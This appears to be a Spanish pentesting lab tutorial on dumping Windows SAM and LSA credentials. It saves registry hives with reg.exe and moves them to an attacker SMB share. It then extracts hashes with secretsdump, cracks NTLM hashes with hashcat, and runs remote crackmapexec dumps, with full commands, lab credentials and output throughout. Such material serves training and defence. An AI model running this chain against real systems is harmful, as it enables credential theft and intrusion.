
# Atacando a SAM

Con acceso a un sistema Windows sin dominio, podemos beneficiarnos al intentar volcar rápidamente los archivos asociados con la base de datos SAM para transferirlos a nuestro host de ataque y comenzar a descifrar hashes sin conexión. Hacer esto sin conexión garantizará que podamos continuar intentando nuestros ataques sin mantener una sesión activa con un objetivo. Repasemos este proceso juntos utilizando un host de ejemplo.

### **Copiar colmenas del registro SAM**

Hay tres colmenas de registro que podemos copiar si tenemos acceso de administrador local en el destino; cada uno tendrá un propósito específico cuando lleguemos a desechar y descifrar los hashes. Aquí hay una breve descripción de cada uno en la siguiente tabla:

<table data-header-hidden><thead><tr><th width="199"></th><th></th></tr></thead><tbody><tr><td><strong>Colmena de registro</strong></td><td><strong>Descripción</strong></td></tr><tr><td><code>hklm\sam</code></td><td>Contiene los hash asociados con las contraseñas de las cuentas locales. Necesitaremos los hashes para poder descifrarlos y obtener las contraseñas de las cuentas de usuario en texto sin cifrar.</td></tr><tr><td><code>hklm\system</code></td><td>Contiene la clave de arranque del sistema, que se utiliza para cifrar la base de datos SAM. Necesitaremos la clave de arranque para descifrar la base de datos SAM.</td></tr><tr><td><code>hklm\security</code></td><td>Contiene credenciales almacenadas en caché para cuentas de dominio. Podemos beneficiarnos de tener esto en un destino de Windows unido a un dominio.</td></tr></tbody></table>

Podemos crear copias de seguridad de estas colmenas usando `reg.exe`

### **Usando reg.exe**

Iniciar CMD como administrador nos permitirá ejecutar `reg.exe` para guardar copias de las colmenas de registro antes mencionadas. Ejecute estos comandos a continuación para hacerlo:

```powershell
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

Técnicamente solo necesitaremos `hklm\sam` y `hklm\system`, pero `hklm\security` también puede ser útil guardarlo, ya que puede contener hashes asociados con las credenciales de cuentas de usuario de dominio almacenadas en caché presentes en hosts unidos a un dominio. Una vez que las colmenas se guardan sin conexión, podemos usar varios métodos para transferirlas a nuestro host de ataque. En este caso, usemos [smbserver.py de Impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) en combinación con algunos comandos CMD útiles para mover las copias de la colmena a un recurso compartido creado en nuestro host de ataque.

### **Creando un recurso compartido con smbserver.py**

Todo lo que debemos hacer para crear el recurso compartido es ejecutar smbserver.py -smb2support usando Python, darle un nombre al recurso compartido (`CompData`) y especificar el directorio en nuestro host de ataque donde el recurso compartido almacenará las copias de la colmena ( `/home/kali/Descargas`).&#x20;

La opción `smb2support` garantizará que se admitan las versiones más recientes de SMB. Si no utilizamos este indicador, habrá errores al conectarnos desde el objetivo de Windows al recurso compartido alojado en nuestro host de ataque. Las versiones más recientes de Windows no son compatibles con SMBv1 de forma predeterminada debido a las [numerosas vulnerabilidades graves](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1) y exploits disponibles públicamente.

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ sudo impacket-smbserver -smb2support CompData /home/kali/Descargas/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

{% endcode %}

### **Mover copias de colmena al recurso compartido**

Una vez que tengamos el recurso compartido ejecutándose en nuestro host de ataque, podemos usar el comando `move` en el host Windows para mover las copias de la colmena al recurso compartido.

<pre class="language-powershell"><code class="lang-powershell"><strong>C:\> move sam.save \\10.10.15.16\CompData
</strong>        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
</code></pre>

Luego podemos confirmar que nuestras copias de la colmena se movieron exitosamente al recurso compartido navegando al directorio compartido en nuestro host de atacante y usar `ls` para enumerar los archivos.

### **Confirmación de copias de colmena transferidas al host de atacante**

```shell-session
afsh4ck@kali$ Descargas/ ls

sam.save  security.save  system.save
```

***

## <mark style="color:purple;">Volcado de hashes con secretsdump.py de Impacket</mark>

Una herramienta increíblemente útil que podemos usar para volcar los hashes sin conexión es Impacket `secretsdump.py`. Impacket se puede encontrar en la mayoría de las distribuciones de pruebas de penetración modernas. Podemos verificarlo usando `locate`en un sistema basado en Linux:

### **Localizando secretsdump.py**

```shell-session
afsh4ck@kali$ locate secretsdump 
```

Usar secretsdump.py es un proceso simple. Todo lo que debemos hacer es ejecutar secretsdump.py usando Python y luego especificar cada archivo de colmena que recuperamos del host de destino.

### **Ejecutando secretsdump.py**

```shell-session
afsh4ck@kali$ impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
[*] NL$KM 
 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....>w4...}..`i
 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
[*] Cleaning up... 
```

Aquí vemos que secretsdump vuelca exitosamente los hashes locales de SAM y también habría volcado la información de inicio de sesión del dominio almacenada en caché si el objetivo estuviera unido a un dominio y tuviera credenciales almacenadas en caché presentes en `hklm\security`. Observe que el primer paso que ejecuta secretsdump es apuntar al archivo `system bootkey` antes de proceder a volcar el archivo `LOCAL SAM hashes`. No puede volcar esos hashes sin la clave de inicio porque esa clave de inicio se usa para cifrar y descifrar la base de datos SAM, por lo que es importante para nosotros tener copias de las colmenas del registro que analizamos anteriormente en esta sección. Observe en la parte superior de la salida de `secretsdump.py`:

```shell-session
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

Esto nos dice cómo leer el resultado y qué hashes podemos descifrar. La mayoría de los sistemas operativos Windows modernos almacenan la contraseña como un hash NT. Los sistemas operativos anteriores a Windows Vista y Windows Server 2008 almacenan las contraseñas como un hash LM, por lo que solo podemos beneficiarnos de descifrarlas si nuestro objetivo es un sistema operativo Windows más antiguo.

Sabiendo esto, podemos copiar los hash NT asociados con cada cuenta de usuario en un archivo de texto y comenzar a descifrar contraseñas. Puede ser beneficioso tomar nota de cada usuario, para que sepamos qué contraseña está asociada con cada cuenta de usuario.

***

## <mark style="color:purple;">Cracking de Hashes con Hashcat</mark>

Una vez que tengamos los hashes, podemos comenzar a intentar descifrarlos usando [Hashcat](https://hashcat.net/hashcat/) . Lo usaremos para intentar descifrar los hashes que hemos recopilado. Si echamos un vistazo al sitio web de Hashcat, notaremos compatibilidad con una amplia gama de algoritmos hash. En este módulo, utilizamos Hashcat para casos de uso específicos. Esto debería ayudarnos a desarrollar la mentalidad y la comprensión para usar Hashcat, así como también saber cuándo debemos consultar la documentación de Hashcat para comprender qué modo y opciones debemos usar según los hash que capturemos.

Como se mencionó anteriormente, podemos completar un archivo de texto con los hashes NT que pudimos volcar.

### **Agregar NT Hashes a un archivo .txt**

```shell-session
afsh4ck@kali$ sudo nano hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

Ahora que los hash NT están en nuestro archivo de texto ( `hashestocrack.txt`), podemos usar Hashcat para descifrarlos.

### **Ejecutando Hashcat contra NT Hashes**

Hashcat tiene muchos modos diferentes que podemos usar. La selección de un modo depende en gran medida del tipo de ataque y del tipo de hash que queremos descifrar. Cubrir cada modo está más allá del alcance de este módulo. Nos centraremos en utilizar `-m` para seleccionar el tipo de hash `1000` para descifrar nuestros hashes NT (también conocidos como hashes basados ​​en NTLM). Podemos consultar [la página wiki](https://hashcat.net/wiki/doku.php?id=example_hashes) de Hashcat o la página de manual para ver los tipos de hash admitidos y su número asociado. Usaremos la lista de palabras `rockyou.txt`:

```shell-session
afsh4ck@kali$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: dumpedhashes.txt
Time.Started.....: Tue Dec 14 14:16:56 2021 (0 secs)
Time.Estimated...: Tue Dec 14 14:16:56 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    14284 H/s (0.63ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 5/5 (100.00%) Digests
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: newzealand -> whitetiger

Started: Tue Dec 14 14:16:50 2021
Stopped: Tue Dec 14 14:16:58 2021
```

Podemos ver en el resultado que Hashcat utilizó un tipo de ataque llamado [ataque de diccionario](https://en.wikipedia.org/wiki/Dictionary_attack) para adivinar rápidamente las contraseñas utilizando una lista de contraseñas conocidas (rockyou.txt) y logró descifrar 3 de los hashes. Tener las contraseñas nos podría ser útil de muchas maneras. Podríamos intentar utilizar las contraseñas que desciframos para acceder a otros sistemas de la red. Es muy común que las personas reutilicen contraseñas en diferentes cuentas personales y laborales. Conocer esta técnica que cubrimos puede ser útil en compromisos. Nos beneficiaremos al usar esto cada vez que nos encontremos con un sistema Windows vulnerable y obtengamos derechos de administrador para volcar la base de datos SAM.

Tenga en cuenta que esta es una técnica bien conocida, por lo que los administradores pueden tener medidas de seguridad para prevenirla y detectarla. Podemos ver algunas de estas formas [documentadas](https://attack.mitre.org/techniques/T1003/002/) dentro del marco de ataque MITRE.

***

## <mark style="color:purple;">Consideraciones sobre el volcado remoto y LSA Secrets</mark>

Con acceso a las credenciales con `local admin privileges`, también nos es posible apuntar a LSA Secrets a través de la red. Esto podría permitirnos extraer credenciales de un servicio en ejecución, una tarea programada o una aplicación que utilice secretos LSA para almacenar contraseñas.

### **Deshacerse de los LSA Secrets de forma remota**

```shell-session
afsh4ck@kali$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
```

### **Volcando SAM de forma remota**

```shell-session
afsh4ck@kali$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
```

## <mark style="color:purple;">Caso práctico</mark>

```
RDP a 10.129.14.175 (ACADEMY-PWATTACKS-WIN10SAM)
Usuario "Bob"
Contraseña "HTB_@cademy_stdnt!"
```

```bash
xfreerdp /u:"Bob" /p:"HTB_@cademy_stdnt!" /v:10.129.14.175
```

Lo primero vamos a descargar los archivos:

```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

<figure><img src="/files/O7OSlxHUeyv1hKp0tdV6" alt=""><figcaption></figcaption></figure>

Después vamos a transferir los archivos a nuestra máquina de atacante. Lo primero vamos a crear un reecurso compartido con impacket:

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ sudo impacket-smbserver -smb2support CompData /home/kali/Descargas/

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

{% endcode %}

Una vez que tengamos el recurso compartido ejecutándose en nuestro host de ataque, podemos usar el comando `move` en el host Windows para mover las copias de la colmena al recurso compartido.

Como estamos en la misma red por VPN, vamos a transferir los archivos de la siguiente manera:

<pre class="language-powershell"><code class="lang-powershell"><strong>C:\> move sam.save \\10.10.14.239\CompData
</strong>        1 file(s) moved.

C:\> move security.save \\10.10.14.239\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.14.239\CompData
        1 file(s) moved.
</code></pre>

<figure><img src="/files/JA4NUqYAo7NTz4ofAKUZ" alt=""><figcaption></figcaption></figure>

Recibimos correctamente los archivos en nuestro smbserver en la carpeta que le especificamos:

<figure><img src="/files/wLMJAlJzVhZLh1VVFGHc" alt=""><figcaption></figcaption></figure>

Ahora si en Kali accedemos la la ruta que le indicamos accederemos a los archivos:

<figure><img src="/files/2IyrzwO88ebgXbstTfng" alt=""><figcaption></figcaption></figure>

Una vez que tenemos los archivos en Kali, vamos a ejecutar `impacket-secretsdump` para volcar todos los hashes de los usuarios del sistema:

```shell-session
afsh4ck@kali$ impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
[*] NL$KM 
 0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
 0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
 0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
 0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
[*] _SC_gupdate 
(Unknown User):Password123
[*] Cleaning up... 
```

Una vez que tenenemos el volcado de hashes, vamos a guardar solo los `nthash` en un archivo de texto:

<pre class="language-bash"><code class="lang-bash"><strong>sudo nano hashes.txt
</strong><strong>
</strong><strong>31d6cfe0d16ae931b73c59d7e0c089c0
</strong>72639bbb94990305b5a015220f8de34e
3c0e5d303ec84884ad5c3b7876a06ea6
a3ecf31e65208382e23b3420a34208fc
c02478537b9727d391bc80011c2e2321
58a478135a93ac3bf058a5ea0e8fdb71
</code></pre>

Y vamos a crackear todos los hashes con `hashcat` y el diccionario `rockyou`:

```bash
sudo hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

c02478537b9727d391bc80011c2e2321:matrix                   
a3ecf31e65208382e23b3420a34208fc:mommy1                   
31d6cfe0d16ae931b73c59d7e0c089c0:                         
58a478135a93ac3bf058a5ea0e8fdb71:Password123  
```
